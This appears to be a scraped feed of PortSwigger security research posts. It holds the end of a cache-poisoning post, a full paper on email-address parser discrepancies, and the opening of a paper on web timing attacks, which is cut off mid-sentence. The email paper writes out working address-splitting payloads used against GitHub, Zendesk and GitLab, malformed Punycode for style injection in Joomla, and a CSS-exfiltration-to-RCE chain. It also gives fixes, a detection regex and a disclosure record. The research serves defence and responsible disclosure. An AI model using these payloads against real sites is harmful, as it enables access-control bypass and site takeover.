isn't possible, consider switching to a different CDN or HTTP server that parses the URL in as similar a way as possible.\nURL parsing discrepancies can be easily exploited using web cache poisoning and deception\nExploitation techniques that can be applied in countless systems and bug bounty programs\nChain web cache poisoning and deception to increase severity and obtain full site take over!", "timestamp": "2025-10-21T13:33:17.572589"}
{"source": "blog", "feed": "https://portswigger.net/research/rss", "title": "Splitting the email atom: exploiting parsers to bypass access controls", "url": "https://portswigger.net/research/splitting-the-email-atom", "published": "Wed, 07 Aug 2024 21:32:47 GMT", "content": "Published: 07 August 2024 at 21:32 UTC\nUpdated: 27 June 2025 at 13:49 UTC\nSome websites parse email addresses to extract the domain and infer which organisation the owner belongs to. This pattern makes email-address parser discrepancies critical. Predicting which domain an email will be routed to should be simple, but is actually ludicrously difficult - even for 'valid', RFC-compliant addresses.\nIn this paper I'm going to show you how to turn email parsing discrepancies into access control bypasses and even RCE.\nThis paper is accompanied by a free online CTF, so you'll be able to try out your new skill set immediately.\nYou can also get this paper as a print/download friendly PDF. You can also grab the slides from Black Hat.\nI presented this talk at Black Hat and DEF CON. You can watch it here:\nSome of the RFCs that dictate the email address format have been around for over 50 years, they have been mangled together to form a standard for email addresses that is way too lenient. Emails can have quoted values, comments, escapes and various encodings. If you are faced with the job of writing an email parser technically you should follow the specification but because of all this complexity it's a difficult job. Web applications farm this complexity out to email parsing libraries and as a result they don't actually know how the email is parsed. This leads to problems when they decide to make security decisions based on the email domain.\nIf you look at 3.2.5 and 3.2.2 of RFC2822 it allows you to use quoted values and escapes. They enable you to use characters not normally allowed in the local-part of the email address. Some examples are:\n\"@\"@example.com\n\"\\\"\"@example.com\nIn the first example because the local-part is quoted the at symbol will be used as a destination mailbox with the quotes removed. In the second example it shows how you can use escapes inside the quoted local-part to use the double quote as the destination mailbox. If we look deeper at the same RFC section 3.2.3 we can see it supports comments. Comments are constructed using parentheses and can contain whitespace and even nest. Here are some examples of \"valid\" emails that use comments:\n(foo)user@(bar)example.com\nYou're not just limited to alphanumeric values either; you can place a multitude of characters within a comment. This all seems ripe for abuse by creating confusion between the parser, the application and the mailer. My journey started in this research by trying to create this confusion by abusing escapes and comments.\nI'm not proud of this story about how I discovered this but it's the truth. I didn't spend hours looking at the Postfix and Sendmail source code with a debugger and there's definitely an element of randomness and luck.\nIt started when I was logged into a box I was using for testing, I installed an unnamed app and began testing it for email parsing discrepancies. I was getting nowhere. Everything I tried was failing, I had thoughts of abandoning the research completely. Then out of an act of desperation I took the special characters the app was using and pasted it into my email address. I knew it would be valid since it was all the characters they allowed but I just wanted to see what would happen with the mailer.\nI checked the syslog of the box and noticed that I was getting a DSN (delivery status notification) with an invalid host. Surprised at this, I began to dig deeper. I started to remove characters from the email address to narrow down why Sendmail thought it was an invalid host. Eventually, I narrowed it down to the exclamation mark and remembered about the UUCP protocol I'd read whilst conducting this research.\nUUCP is an ancient protocol that existed before the Internet and email. It allowed you to send messages between Unix systems and stands for Unix To Unix Copy. It works by using the exclamation mark as a separator between the domain and user part but in the opposite order of the traditional email address.\nThis was bonkers, by sheer luck the characters I pasted ended with a backslash which escaped the at symbol and then the exclamation mark was treating the address as a UUCP address! Here is my discovery in all its glory:\nOriginal discovery:\n!#$%&'*+\\/=?^_`{|}~-collab\\@psres.net\nNaturally, I had to follow up with a different Collaborator domain to be sure it's actually going to a different server:\noastify.com!collab\\@example.com\nThe preceding example goes to the Collaborator domain \"oastify.com\" not example.com when using Sendmail 8.15.2. This was really exciting to me because I proved that this research was actually going somewhere. The next step was to find other characters that caused this behaviour so I wrote a SMTP fuzzer quite quickly. I discovered that Postfix didn't have this behaviour because it's more secure right? Well that's what I thought until I found a variation in Postfix 3.6.4 via the fuzzer:\ncollab%psres.net(@example.com\nThis actually goes to psres.net not example.com and uses yet another archaic protocol called source routes. Source routes allow you to use a chain of servers to send mail. The idea was you separate each host with a comma and then include the final destination at the end. There is also what is called the \"percent hack\", this is where the mailer will convert the % or different chosen character to the at symbol and then forward on the email to the server. This example illustrates this:\nfoo%psres.net@example.com\nfoo@psres.net\nIn this process, the email is initially sent to example.com, after which the percent symbol is converted to an at symbol and an email is sent to foo@psres.net. This is exactly what is occurring with the vector, the parenthesis comments out the domain part of the email address which then Postfix uses the local-part as a source route that sends the email to the unexpected destination. Postfix actually supports UUCP too. I later found out if you use the single parenthesis trick.\nThese findings gave me confidence that there are a ton of bugs out there and so I began looking for more.\nOne of the main problems I had to solve with this research was generating blocked characters. Since many web applications will block multiple at symbols. This is why I started to look into unicode overflows.\nI was testing an unnamed target and noticed that when using higher unicode characters they would generate other ASCII characters. This pattern seemed random at first but then I grasped what was going on. It's probably best illustrated from an image of how the chr() algorithm works in PHP. The chr() function returns a character specified by an integer code point:\n-In the example, PHP loops through the bytes and checks if it is less than zero, if it is it adds 256 until it's positive. Then it performs a modulus operation to fit the value within 0-255. This means if you pass a byte value greater than 255 it will be overflowed and forced into the 0-255 range because of the modulus operation. This is exactly how unicode overflows work; we simply need to provide a character who's codepoint is greater than 255 to generate other characters. This is best illustrated with a simple example:\nString.fromCodePoint(0x100 + 0x40)\nIn the preceding example I use the fromCodePoint function to generate a character, I pass a hex value of 0x100 which translates to 256 decimal then I add 0x40 which is the hex number for the at symbol. Then when the system performs an operation like the chr() function in PHP the unicode code point will be overflowed and fit within 0-255 which will then generate the at symbol.\nAfter I discovered this I started fuzzing the unnamed target with Turbo Intruder and noticed that other characters were exhibiting this behaviour. At first it seemed random but then I realised what was happening, 0x100 is just one of the numbers you can use to perform an overflow. If you use higher characters, you can use any of the characters in-between.\nString.fromCodePoint(0x100 + 0x40) // ŀ → @\nString.fromCodePoint(0x1000 + 0x40) // ၀ → @\nString.fromCodePoint(0x10000 + 0x40) // 𐁀 → @\n...\n0x10ffff\nEach of the hex values above create overflows because the modulus operation will result in zero and this can continue until the current maximum unicode codepoint which is 0x10ffff. This target was allowing all sort of unicode characters to create other characters:\n'✨' === '('\n'✩' === ')'\n'✻' === ';'\n'✼' === '<'\n'✽' === '='\n'✾' === '>'\n'❀' === '@'\nIf you perform a 256 modulus operation on each of the characters it will result in the generated character:\n//Mod each code point by 256\n'❀'.codePointAt(0) % 256 === 0x40\nString.fromCodePoint(0x40)\n// @\nAlthough I was able to spoof a wide range of characters I was unable to split an email on this unnamed target with this technique. But this was just the start, I proved that it was possible to generate blocked characters. This gave me the confidence to look for more.\nThe more I started to look, the more the email RFC's wanted to give. I had assumed before this research that emails were generally alphanumeric with dots in the local-part. I never imagined that a whole complex encoding system existed that allowed you to perform layers of encoding. Yet this is what I discovered. Scouring the RFC's I noticed rfc2047 and encoded-word, this encoding system allows you to represent characters using hex and base64.\nIf we use an encoded email as an example illustration:\nThe \"=?\" indicates the start of an encoded-word, then you specify the charset in this case UTF-8. Then the question mark separates the next command which is \"q\" which signifies \"Q-Encoding\" after that there's another question mark that states the end of the encoding format and the beginning of the encoded data. Q-Encoding is simply hex with an equal prefix. In this example I use =41=42=43 which is an uppercase \"ABC\". Finally, ?= indicates the end of the encoding. When parsed by an email library the email destination would be ABCUSER@psres.net!\nArmed with this information I started to look for real systems that parsed emails using this encoding. To help with this I came up with two probes that worked on most sites that had this behaviour:\nInitially I was using the charset \"x\" to reduce the size of the probe, however some systems reject unknown charsets and would fail. It's best to use these two probes as I've found them to be the most common allowed charsets after testing lots of sites. Use the Collaborator to generate a payload and replace \"collab\" above with the generated one. Then if you get an SMTP interaction with the email in the RCPT TO command of the SMTP conversation:\nabccollab@psres.net\nThis then proves the email parser is decoding the email with \"encoded word\".\nI found a bunch of sites with this behaviour and they all had one thing in common. Ruby. It appeared they all used the same Ruby Gem called \"Mail\" which has over 508 million downloads. I started to look at the source and I found that the library was decoding UTF-7! In my test bed I tried to reproduce this:\nThis is insane! Emails can have UTF-7 now! Then an idea popped into my head: if there is Q-Encoding and charsets, can you have both? The surprising answer to this question is a resounding yes. You can blend UTF-7 with Q-Encoding!\nAfter that I started to play with base64 encoding because of course \"encoded-word\" supports that in emails! You simply use \"b\" instead of \"q\" in the encoding type and you can use it.\nThe preceding example uses base64 encoded string \"foobar\" which gets decoded by the parser. I know what you are thinking or maybe it's just me but yes you can use UTF-7 and base64 encoded data:\nIn this example there is a base64 encoded address with a UTF-7 charset. First the email parser will decode the base64. Then the email parser will decode the UTF-7 charset. Finally the email will be decoded to foobar@psres.net. At this point you might have a few doubts about following the RFC to the letter. Especially when I tell you this works in the domain part too when I tested the Mail library. Note I'm using alphanumeric values here but you can of course encode any special characters too.\nSo far we've seen how to create email domain confusion and surprising encodings but it was time to use this knowledge to exploit real systems. One of the first targets I tested was Github. I specifically went after Github because I knew it was written in Ruby.\nI used the two probes I mentioned earlier to confirm Github supported \"encoded-word\". The email was decoded in the Collaborator SMTP conversation! So I began testing further. What I needed to do was to use \"encoded-word\" to produce another at symbol. At first I started playing with quoted local-part values and I was successful embedding raw at symbols in the quoted value. Maybe I could use \"encoded-word\" inside a quoted local-part to break out of the quoted value and produce two different addresses? I experimented with =22 (double quote) and =40 (at symbol) but didn't have any success.\nThe trouble with this research is you don't get any feedback sometimes because it passes the email validation but fails before it hits the mailer. You can use DNS interactions as a clue but often they are next to useless because you can't identify the cause of the failure to get to the mailer.\nAfter many attempts I started to think about the SMTP conversation and I attempt to place greater than characters. The thinking here is that I could use it to end the RCPT TO command in the SMTP conversation:\nRCPT TO:<\"collab@psres.net>collab\"@psres.net>\nThe preceding example shows a quoted local-part with a raw at symbol and greater than. You can start to see how an attack could take shape. You have two addresses and the idea to use greater than would then enable you to ignore the second address in the SMTP conversation. With this idea fixed in my head I began using encoded vectors to construct an attack.\nI quickly found that double quotes weren't of any use for Github, the reason for this is it always left an open double quote which would fail validation. I tried encoding it and escaping of course but with no success. I removed the quotes and used \"encoded-word\" to generate the at symbol and greater than, it passed validation but I didn't get an email. No SMTP conversation. Nothing. Thinking about this I thought maybe the trailing junk at the end of the email was causing the Mailer to fail either with an exception or validation. What if I could introduce some characters that would avoid the exception or validation? I tried encoded whitespace but that failed then I tried an encoded null and bingo! I had an interaction with the following email:\nFor Github the charset doesn't matter so I used \"x\", the encoded at symbol (=40) gets converted to an at and the greater than (=3e) finishes the RCPT TO command and finally the null (=00) makes the mailer ignore everything after, you need to place a valid local-part after the encoded so I used \"foo\" this successfully passes validation and splits the email. I could then verify any email domain I liked. I had verified addresses on my test account with microsoft.com, mozilla.com and github.com:\nThis was already a bug since you shouldn't be able to verify addresses you don't own. Then my colleague James Kettle suggested I look at Cloudflare \"Zero Trust\" and see if it could be configured to trust certain email domains. I created a test account and dug into the configuration and found you could use Github as an IdP and use the email domain to determine if you had access to a site. This could be an internal network or any other domain protected with Zero Trust provided they use Github as an IdP.\nAfter my success with Github I began to look for applications that used Ruby and had some form of email domain validation. One that stood out to me was Zendesk because maybe you could get access to a protected support desk? Before I tried splitting email addresses I searched through their documentation and found you need to turn on the support centre, allow registration and then select domains that are allowed to register.\nThe Support centre was configured and I began testing. I tried all the attacks I used on Github but with no success. Maybe they were using a different mailer or validation? I tried some new ideas using a quoted local-part of the email and with the interactions I got back in the Collaborator it seemed more promising then when I tested Github.\nWhat I found useful is using two duplicate Collaborator domains so I always got the interaction and by examining the SMTP conversation you could see what was being converted. I sent the following:\nInput:\n=?x?q?=41=42=43collab=40psres.net=3e=20?=@psres.net\nAnd got the following back:\nOutput:\nRCPT TO:<\"ABCcollab@psres.net> \"@psres.net>\nThis interaction told me a bunch of things, first is they allow uppercase. Next is they allow converted spaces and third they seem to quote values that aren't normally allowed in the local-part when decoded. Maybe I could abuse this behaviour?\nAfter many more attempts I finally got somewhere. I fooled the parsing/validation to convert characters blocked characters, doubled encoded quotes and generated characters that would be removed by their code until finally I constructed a valid email splitting attack:\nUsing this \"email\" I was able to bypass the restrictions set on the support centre. The key to this attack was the embedded encoded quotes that were decoded by the parser. Then the =3c22 generates a less than character that gets removed which then completes the quote so it passes by their validation/exceptions. You'll notice the \"=3e=00\" is the same sequence I used on Github, so they obviously share some of the same code but how they responded was a lot different hence the more completed attack.\nLooking for more Ruby fresh meat I turned to Gitlab. They are an IdP and offer an Enterprise product so it seemed like a good target to test. James had a Gitlab server he previously tested so I began looking at that first. You could configure it to allow registrations with a specific domain. So this immediately caught my attention. I tried the vectors I used on Github and Zendesk but they didn't work. Then I remembered \"encoded-word\" allows you to use underscore as a space and this vector is the most elegant I've demonstrated so far:\nI used Postfix as the mailer of the configured Enterprise instance. You can use =20 to do the same thing but underscore is 1 character and I love elegant vectors!\nThis means I could have gained access to Gitlab Enterprise servers that use domain-based registration restrictions. As I mentioned Gitlab is also an IdP so I began testing the web app too. The Enterprise hack didn't work here. I think that's because they use a different Mailer. However, it didn't take me long to find another vector. By now I collected a bunch of vectors so I had a Turbo Intruder script that went through all the known vectors and also tried others. It found a new vector using an encoded space, this made sense since this worked on the Enterprise product it just required a different method to exploit:\nIt's very similar to the Github exploit but it required a valid charset and needed space not null. In the diagram I used \"x\" but in a real attack you'd use \"iso-8859-1\".\nUnfortunately, I didn't exploit everything I tested and there were many failures. Each one was a learning process but what was interesting about this case study was that \"encoded-word\" was being parsed and decoded on a system other than a Ruby based system.\nI had already constructed a test bed on the advice of James and so I began testing how PHPMailer parsed emails. I did a mixture of black-box and white-box testing and I discovered that it didn't parse \"encoded-word\" inside the local-part or domain part of the email address. However, it did parse and decode it in the name part outside of the email address!\n=?utf8?q?=61=62=63?=<collab@psres.net>\nAnalysing the code the angle brackets where required which meant that it would often fail validation in applications like Wordpress. I attempted to embed payloads in the name parameter of various applications but wasn't able to exploit this particular library. Still I bet you can embed XSS payloads with \"encoded-word\" and this will work somewhere. Please get in touch if you manage to do it, I'd love to hear about it.\nWe've already explored how you can manipulate email parsing to sidestep access controls. But let's take things a little further. What if an email address could be weaponized to gain Remote Code Execution (RCE)? In this section, we'll cover Punycode attacks and how I exploited Joomla.\nPunycode is a way to represent unicode characters in the current DNS system. Punycode always starts with xn-- and is followed by hyphens and alphanumeric characters. Non-ASCII characters are encoded using a special algorithm that represents these characters. The algorithm converts the sequence of Unicode characters into a representation that utilizes only ASCII characters. The algorithm dictates that generally any ASCII characters in the input that do not form unicode characters are to be added to the output as is. For example the domain münchen.com is encoded with the following Punycode sequence.\nxn--mnchen-3ya.com\nThe very nature of how Punycode works makes it difficult to test because changing one character can affect the entire output and the character position due to how the algorithm works. What we want to do is generate malicious characters when the encoded value is decoded and doing that is a big challenge. In the following examples you can see the position of the unicode character changes when one byte is modified.\nfoo@xn--mnchen-2ya.com → foo@ümnchen.com\nfoo@xn--mnchen-3ya.com → foo@münchen.com\nfoo@xn--mnchen-4ya.com → foo@mnüchen.com\nfoo@xn--mnchen-5ya.com → foo@mncühen.com\nAfter reading all about this on Wikipedia, I followed a link to an online Punycode converter. The converter used the IDN PHP library. and started to try various Punycode addresses. I discovered that if you used two zeros at the start you could generate unintended characters:\nInput:\npsres.net.com.xn--0049.com.psres.net\nOutput:\npsres.net.com.,.com.psres.net\nThis was my first successful attempt at creating malformed Punycode. The input contains the Punycode \"xn--0049\" which decodes to a comma thanks to a defective library. I was able to generate many more characters using this technique:\nInput:\nfoo@xn--0117.example.com\nOutput:\nfoo@@.example.com\nThere were many ways to generate the same character. I thought about email splitting attacks but I concluded that the Punycode address wouldn't be decoded when the email is sent because it would be invalid. It's far more likely that it would be decoded when displaying the email. Naturally, the question I asked myself was can you create an XSS vector?\nThis was a job for a fuzzer. I started constructing one and it immediately started to produce interesting results:\nx@xn--42 → x@,\nx@xn--024 → x@@\nx@xn--694 → x@;\nx@xn--svg/-9x6 → x@<svg/\nx@xn--svg/-f18 → x@<svg/\nx@xn--svg/-fq1 → x@<svg/\nI thought this would be a good time to find applications using the IDN PHP library. After searching Github I found an interesting target using the library: Joomla! This was great because if I get XSS then I have RCE. Doing source code analysis I noticed that they were escaping the email of users before it was Punycode decoded. This means if I could produce some malformed Punycode that when decode produces HTML I could get XSS but it wouldn't be that easy.\nI went back to my fuzzer with excitement and started generating millions of character combinations. I managed to construct partial XSS vectors, but encountered several issues. I could only generate two ASCII characters by using more than one Punycode subdomain. This limitation arose from the specific workings of the Punycode algorithm, PHP, and the quirks of the buggy PHP IDN library. As you can see in the examples I was close but these problems made exploiting Joomla very difficult.\nxn--x-0314.xn--0026.xn--0193.xn--0218 → <x.. .=\nxn--x-0314.xn--0026.xn--0193.xn--54_52932 → <x.. .='\nI concluded that XSS was not feasible because, although I was able to generate a single-quoted HTML attribute, it required an underscore character. Joomla, however, does not permit underscores in the domain part of an email address.\nSo was that the end of the story? Not quite. I thought about this for a while and worked out that if you use a single Punycode subdomain you could generate any opening tag! Eventually after a lot of testing I concluded that the only exploitable vector was an opening style tag:\nThe rest of the preexisting Joomla HTML code would add a space and closing angle bracket. The email was outputted on the user list page. This means it was persistent and also didn't even need an activated account. You could simply register a user and it would be persistent style injection! But how do we get our evil CSS in there? To do that you need a place to put the CSS without being blocked. The name field of the user was a good choice for this and you could use an @import to import the evil style.\nThe problem I had was all the HTML code that occurs after the style injection would be treated as CSS! To get around this you simply need to fool the CSS parser into thinking this is all an invalid CSS selector and this means just using {}. So if you place after at the start of your name field you can then import a style after. The attack works like this:\nNotice the first account name has an \"a\" and the second account name has \"x\", this is to ensure the style injection occurs first and the second account uses a @import. The curly braces are used to treat all the HTML that occurs before the import as an invalid CSS selector. Chrome's strict CSS mime type check doesn't apply here either because an inline style was used.\nWhat we needed to do now is exfiltrate the CSRF token via CSS and thankfully there have been many good posts on this. The best way is to use import chaining and use one of the tools developed by d0nut and Pepe Vila. I decided to customise the tool I already developed with my blind CSS exfiltration research which involved making it extract the specific Joomla token. I'll share the customised code in the Github repo later in the post.\nWith my CSS exfiltrator running, I registered the two accounts and visited the users page with the super admin account. The exfiltrator showed the admin's CSRF token so now the next step was to feed the admin the CSRF exploit that used the exfiltrated token. My exfiltrator also builds the CSRF exploit. The exploit then modifies an admin template to get RCE!\nHere is a demo of the attack:\nIn the video the admin browser in lighter colours is on the left and the attacker's browser is in darker colours on the right. The attacker registers two accounts, the first to inject the style tag from a malformed Punycode address, and the second to inject the CSS exfiltration stylesheet. Then the admin visits the backend and the user list page, the malicious CSS gets loaded instantly and exfiltrates the token in seconds.\nAs soon as this happens the attacker gets notified of the admin's CSRF token and then starts an instant message conversation with the admin. The admin clicks the link from the attacker and gets CSRF'd to edit a backend template to inject some PHP that calls the system command to cat /etc/passed.\nWhilst conducting this research I developed a methodology that I found useful when testing. Probe, Observe, Encode and Exploit. First use the probes mentioned in this post and then observe the results in a tool like Collaborator. Repeat the process until you have the required characters for your attack. Then when this process is finished do the exploit. You can apply this methodology to both encoded-word and Punycode attacks.\nFirst probe for \"encoded-word\", observe the decoded email to confirm that it is supported. Then encode various characters and observe how they are decoded. Then follow up with an exploit that abuses these characters.\nTo observe the results I used Burp Collaborator which allowed me to view SMTP interactions.\nTo assist with finding email splitting attacks I've created a couple of Hackvertor tags. Hackvertor is a free Burp Suite extension I wrote that allows you to use tags in a request and perform nested conversions on the data. You simply place the tag where you want the unicode overflow to happen and then place the characters you want to convert inside the tag:\n<@_unicode_overflow(0x100,'...')>@</@_unicode_overflow>\n<@_unicode_overflow_variations(0xfff,'...')>@</@_unicode_overflow_variations>\nfoo<@_encoded_word_encode('...')>@<@/_encoded_word_encode>example.com\n<@_encoded_word_decode('...')>=41=42=43<@/_encoded_word_decode>\n<@_email_utf7('...')><@/_email_utf7>\n<@_email_utf7_decode('...')><@/_email_utf7_decode>\n<@_encode_word_meta('iso-8859-1','...')><@/_encode_word_meta>\nThe first tag creates a single unicode overflow and uses the tag argument 0x100 which is 256 in decimal to create the overflow. The second uses the tag argument as the maximum unicode codepoint and generates as many characters as it can that overflow to the character specified inside the tag. The third tag will allow you to perform an encoded-word conversion, in the example I encode the @ symbol. The forth tag will decode the encoded-word sequence. There are further tags to help create and decode UTF-7 emails and the encoded-word meta characters.\nTo use these tags you need to enable \"Allow code execution tags\" in the Hackvertor menu. Then click the \"View Tag Store\" in the same menu. You can then install both tags by clicking on their name and then using the install button.\nWhen I found the first few bugs I found automation very useful for finding other bugs and often Turbo Intruder was very useful to automate this process. Turbo Intruder is another free Burp extension written by James Kettle. I've created a Turbo Intruder script to help exploit a mailer. This script is used when you've identified that the server supports encoded-word but you want to know if the mailer will allow you to split the email by using nulls or other characters.\nIt uses a list of known techniques that split an email that I've discovered whilst testing Github, Zendesk, Gitlab, Bugcrowd and many others. You can easily customise the script to perform other attacks mentioned in this presentation. To use it you just need to change the validServer variable to your target domain to spoof. You then place %s in the request where you want your email to be added and then right click on the request and send to Turbo Intruder and use the modified script. Then run the attack. If the attack works you should receive a collaborator interaction within Turbo Intruder. This means the email domain is spoofable. If you encounter applications with rate limits (as I did) you can change the REQUEST_SLEEP variable to play nicely with those servers.\nI created a Punycode fuzzer to help find malform Punycode. I shared it with my PortSwigger colleagues and I created a challenge to see if anyone could generate an XSS vector within the restrictions I had. Nobody managed it but I got RCE anyway via CSS exfiltration. The fuzzer works by giving it some input with a Punycode address and the placeholders are substituted with random numbers, characters or whitespace. Matches and contains are just regexes to match the fuzzed output. It was very effective in finding what characters could be generated.\nAt DEF CON I presented a few bonus vectors as I had 5 minutes extra time.\nThe RFC allows what are called SMTP optional parameters. One of the parameters \"ORCPT\" can be used to smuggle the domain part of the email address and change it's destination. Since many applications often accept a quoted local-part but incorrectly handle escape characters you can abuse this to change the email destination:\n\"foo\\\\\"@psres.net> ORCPT=test;admin\"@example.com\nThis technique works in Postfix but probably other mailers too.\nAs a further bonus here is some more surprising email parsing behaviour I uncovered that works in Postfix. I couldn't use these for access control bypasses but they are nevertheless interesting and challenges your assumptions on how email addresses are parsed. The first one uses UUCP and is sent regardless of the quotes.\nInput: \"psres.net!collab\"(\\\"@example.com\nResults in email to: collab@psres.net\nThe second one uses a source route even with the square bracket syntax.\nInput: collab%psres.net@[127.0.0.1]\nResults in email to: collab@psres.net\nI recommend you disable \"encoded-word\" when using an email parsing library. As a last resort you can prevent it from being used by looking for the opening and closing characters of \"encoded-word\" in the email address using the following regex:\n=[?].+[?]=\nYou should always validate an email address even when it comes from a SSO provider such as Github. Never use the email domain as a sole means of authorisation, because it can be easily spoofed as we've seen.\nA few blog posts/slides were really inspirational when conducting this research. I really recommend you read each one because they contain really useful information. The import chaining technique I used to exfiltrate the CSRF token is from Pepe Vila and d0nut.\nEmail parsing:\nhttps://www.jochentopf.com/email/address.html\nhttps://nathandavison.com/blog/exploiting-email-address-parsing-with-aws-ses\nhttps://medium.com/@fs0c131y/tchap-the-super-not-secure-app-of-the-french-government-84b31517d144\nCSS Exfiltration:\nhttps://vwzq.net/slides/2019-s3_css_injection_attacks.pdf\nhttps://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b\nAll materials for this research is available on the Github repository\nWe've created a CTF on the Web Security Academy so you can try out your new skills. For your convenience I've also created a docker file with the vulnerable version of Joomla in the Joomla directory of the Git repository.\nReported to Joomla on 30th Jan, 2024, 3:40pm - Fixed on 20th Feb, 2024\nCVE-2024-21725\nReported to IdnaConvert PHP library on 8th Feb, 2024, 11:49am - Fixed on 14th Feb,\n2024\nReported to Gitlab on 5th Feb, 2024, 11:55am - Fixed on April 25, 2024\nReported to Github on 5th Feb, 2024, 11:55am - Fixed on May 9, 2024\nReported to Zendesk on 5th Feb, 2024, 2:54pm - Fixed on May 9, 2024\nValid email addresses can trigger major parser discrepancies\nEven addresses that end in \"@example.com\" might go elsewhere.\nAs a result, it's never safe to use email domains for access control enforcement", "timestamp": "2025-10-21T13:33:18.838884"}
{"source": "blog", "feed": "https://portswigger.net/research/rss", "title": "Listen to the whispers: web timing attacks that actually work", "url": "https://portswigger.net/research/listen-to-the-whispers-web-timing-attacks-that-actually-work", "published": "Wed, 07 Aug 2024 18:10:21 GMT", "content": "Published: 07 August 2024 at 18:10 UTC\nUpdated: 18 November 2024 at 08:32 UTC\nWebsites are riddled with timing oracles eager to divulge their innermost secrets. It's time we started listening to them.\nIn this paper, I'll unleash novel attack concepts to coax out server secrets including masked misconfigurations, blind data-structure injection, hidden routes to forbidden areas, and a vast expanse of invisible attack-surface.\nThis is not a theoretical threat; every technique will be illustrated with multiple real-world case studies on diverse targets. Unprecedented advances have made these attacks both accurate and efficient; in the space of ten seconds you can now reliably detect a sub-millisecond differential with no prior configuration or 'lab conditions' required. In other words, I'm going to share timing attacks you can actually use.\nTo help, I'll equip you with a suite of battle-tested open-source tools enabling both hands-free automated exploitation, and custom attack scripting. I'll also share a little CTF to help you hone your new skillset.\nWant to take things further? I'll help you transform your own attack ideas from theory to reality, by sharing a methodology refined through testing countless concepts on thousands of websites. We've neglected this omnipresent and incredibly powerful side-channel for too long.\nThis research paper accompanies a presentation at Black Hat USA and DEF CON:\nYou can also read this whitepaper in a print-friendly PDF format.\nWeb timing attacks are notorious for two things; making big promises, and failing to deliver. Examples are often theoretical, and even where a technique is dubbed 'practical' everyone knows it'll stop working as soon as you try to apply it outside a lab environment.\nThis reputation might be why we've ignored a huge opportunity.\nMy first foray into researching timing attacks yielded results firmly in the 'theoretical' bucket. For my second attempt, I started by looking back over attacks that I'd successfully applied in the wild, alongside others that I'd read about:\nFrom the top, these are examples of:\nIn the hunt for novel techniques that work in the wild, I focused on the divide between the two categories, which is massive:\nTiming attack research is often focused on a single target, but this constrains its real-world value. I wanted techniques that could be applied to arbitrary live targets. To ensure my new attack concepts met this standard, I validated them on a test bed of 30,000 live websites. Based on bbscope and Rapid7's Project Sonar DNS database, the test platform was a 20 GB Burp Suite project file containing every known website with a bug bounty program.\nBefore this research, the smallest time gap I'd personally exploited was 30,000μs. Now, it's 200μs. This was made possible by massive advancements in timing-attack accuracy, and enables multiple powerful new techniques.\nThree key attack techniques stood out as providing valuable findings on a diverse range of live systems: discovering hidden attack surface, server-side injection vulnerabilities, and misconfigured reverse proxies. In this paper, I'll explore each of these in depth.\nAll three techniques are now available in Param Miner so, if you wanted to, you could stop reading and try them out right now. The true value of this research comes from understanding that it doesn't stop here; these are just a sample of what's possible. Timing attacks can take you almost anywhere, but to grasp this potential, we need to start from the beginning.\nLet's have a closer look at the key factors that real-world timing attacks live or die by, and how to overcome them. In this section, I'll show how to make timing attacks 'local', portable, and feasible.\nIt's easy to assume that all web timing attacks are exploits, but this is a mistake because it limits your thinking around potential applications. At their core, web timing attacks are simply about answering difficult questions - ones that can't be answered by observing the server's response.\nI started this research by attempting a timing-based exploit on password resets. It went badly, but nicely illustrates the gap between theory and reality. Many websites implement password resets by storing a secret token in their database and sending the token in a link to the user's registered email address. When the user clicks the link, the website compares the user-supplied token with the one in the database.\nUnder the hood, string comparisons typically compare one character at a time until they either finish the string or encounter a non-matching character pair. This means that the more characters match, the longer the comparison takes:\nIn this illustration, we're using two HTTP requests to ask the question 'Does the database contain a password reset token starting with d7e?' The server is taking one second to compare each character, so by comparing the response times an attacker can tell that the token starts with 'd7e' rather than 'd7f.\nUnfortunately, the actual time to compare each character is somewhere in the realm of 5 nanoseconds, or 0.000000005 seconds. Good luck exploiting that.\nThe success of every timing attack comes down to two competing variables - signal and noise. Signal refers to the size of the timing difference you want to detect, and noise refers to everything else that affects the response timing. If the signal is too quiet relative to the background noise, you won't hear it:\nFor an attack that actually works, you need to maximize the signal and minimize the noise. The rest of this section is focused on how to do this.\nNote that this equation does not include 'number of measurements'. You can attempt to cancel out noise by taking repeated measurements, but this approach scales poorly. Once noise heavily outweighs signal you'll quickly need billions of measurements, resulting in an attack that takes so long the target will probably be decommissioned before it's complete.\nYou can split noise into two parts - network noise (jitter), and server noise (internal jitter):\nNetwork jitter is the variation in latency - the time taken for a packet to get to a target system and back again. It's the classic nemesis of remote timing attacks. When someone sees a timing attack demonstrated against a local system and says 'That'll never work on a remote system', they're basically saying that network jitter is going to make the attack impossible. Five years ago, this might have been true.\nIn 2020, Timeless Timing Attacks showed that you could fully eliminate network jitter from measurements using HTTP/2. You could place two HTTP/2 requests into a single TCP packet, ensuring they arrive at the server simultaneously. Then you could look at the order the responses arrive in, inferring which took longer to process on the server:\nThis single discovery eliminated the biggest source of noise and shifted the boundaries of what's detectable. There's just one small catch.\nAt the HTTP/2 layer, the two requests are completely concurrent, but the underlying TLS data is a stream so one request is still 'first' i.e. one will be fully decrypted before the other. If you try this technique out, you'll notice that websites show a significant bias towards answering the first request first. This bias probably stems from multiple factors, including the time it takes to decrypt the second request and resource availability. Unfortunately, this can mask the delay that you're trying to detect:\nThe authors noticed this problem and tackled it by adding dummy parameters to slow down parsing of the first request, in an attempt to resynchronise execution.\nLab environments are known for having less noise than real targets, but there's also a second, subtler issue. Focusing on a single target often yields target-specific techniques that require extensive tuning to apply anywhere else This makes them significantly less valuable for anyone working to a deadline.\nUnfortunately, dummy parameter padding is an example of this problem - its effectiveness depends on how the target implements parameter parsing, and how much processing capacity the system has available at that moment. Since spare processing capacity is affected by other systems, parameter padding can actually end up increasing the level of noise. I've observed different numbers of parameters being required on a single lab system, ten minutes apart.\nWhat we really need is a way of tackling the sticky request-order problem that doesn't require per-target configuration. The single-packet attack, which I developed last year for race-condition discovery, provides a good starting point for this. The single-packet attack fragments the request in order to reduce the size of the 'critical packet' - the packet that completes the request and initiates execution.\nIt works by sending the bulk of the requests in an initial few packets, then completing the requests and triggering execution with a tiny final packet. In this diagram, the final critical packet is outlined in black:\nUnfortunately, this introduces a different catch - some servers start to process HTTP requests as soon as they've got the headers, without waiting for the body. To fix that, we need to persuade our OS network stack to coalesce the header frames into a single packet so that regardless of which stage the server starts processing at, both requests get processed at the same time:\nYou might be wondering why I opted to split the requests into just two critical packets, instead of one packet per HTTP header. That would indeed be ideal, but unfortunately the HTTP/2 RFC forbids interleaving header frames from separate requests so it's unlikely to work.\nImplementing this dual-packet sync turned out to be extremely easy - just add an extra 